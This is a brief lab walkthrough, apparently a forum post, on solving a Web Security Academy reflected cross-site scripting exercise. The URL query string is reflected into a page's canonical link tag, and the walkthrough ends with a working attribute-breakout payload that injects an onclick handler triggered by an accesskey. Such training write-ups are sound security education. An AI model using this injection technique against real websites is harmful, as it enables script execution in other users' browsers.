I saw that whatever I put after `/?` in the URL is reflected in the canonical tag:

`.web-security-academy.net/?5`

From page source:

```html
<!DOCTYPE html>
<html>
    <head>
        ...
        <link rel="canonical" href='...web-security-academy.net/?5'/>
        ...
    </head>
```

So I gave this link a try:

`web-security-academy.net/?' href='alert()' accesskey='x'`

but it didn't work, probably because `href` is already defined.  
So I tried `onclick` instead:

`web-security-academy.net/?' onclick='alert()' accesskey='x'`

But still no success. I looked in the page source and saw this:

`web-security-academy.net/?'%20onclick='alert()'%20accesskey='x''`

Which means the spaces probably mess this up, so I removed them and solved the lab:

`/?'onclick='alert()'accesskey='x'`